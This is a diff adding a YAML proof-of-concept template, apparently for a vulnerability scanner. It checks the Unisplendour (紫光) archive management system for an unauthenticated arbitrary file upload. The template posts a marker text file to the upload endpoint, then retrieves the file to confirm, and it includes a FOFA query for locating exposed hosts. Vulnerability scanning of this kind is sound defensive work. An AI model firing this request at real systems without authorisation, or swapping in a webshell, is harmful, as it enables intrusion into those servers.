@@ -1,0 +1,64 @@
+id: poc-yaml-thams-system-upload
+info:
+  name: 紫光档案管理系统upload.html接口存在任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 任意写入
+  finger: 紫光电子档案管理系统
+  fofa: app="紫光档案管理系统"
+variables:
+  rand: to_lower(random_str(10))
+requests:
+- method: POST
+  path: /System/Cms/upload.html?token=
+  headers:
+    Content-Type: multipart/form-data; boundary=c8fe659c69f6f5f6a7edaf5e1cca5d34
+  data: '--c8fe659c69f6f5f6a7edaf5e1cca5d34
+
+    Content-Disposition: form-data; name="files[]"; filename="1.txt"
+
+
+    This website has a vulnerability!!!+{{.rand}}
+
+    --c8fe659c69f6f5f6a7edaf5e1cca5d34
+
+    Content-Disposition: form-data; name="userID"
+
+
+    admin
+
+    --c8fe659c69f6f5f6a7edaf5e1cca5d34
+
+    Content-Disposition: form-data; name="fondsid"
+
+
+    1
+
+    --c8fe659c69f6f5f6a7edaf5e1cca5d34
+
+    Content-Disposition: form-data; name="comid"
+
+
+    1
+
+    --c8fe659c69f6f5f6a7edaf5e1cca5d34
+
+    Content-Disposition: form-data; name="token"
+
+
+    1
+
+    --c8fe659c69f6f5f6a7edaf5e1cca5d34--
+
+    '
+  output:
+  - regex_match(body,`\\"savename\\":\\"(?P<filename>.*?).txt`)
+  - regex_match(body,`cms\\\\\\/(?P<date>.*?)\\\\\\\/`)
+  expression: "status_code == 200 && \ncontains(body,\"savename\") &&\ncontains(body,\"\
+    savepath\")\n"
+- method: GET
+  path: /uploads/company1/fonds1/cms/{{.date}}/{{.filename}}.txt
+  expression: "status_code == 200 && \ncontains(body,\"This website has a vulnerability\"\
+    ) &&\ncontains(body,rand)\n"
+transport: http
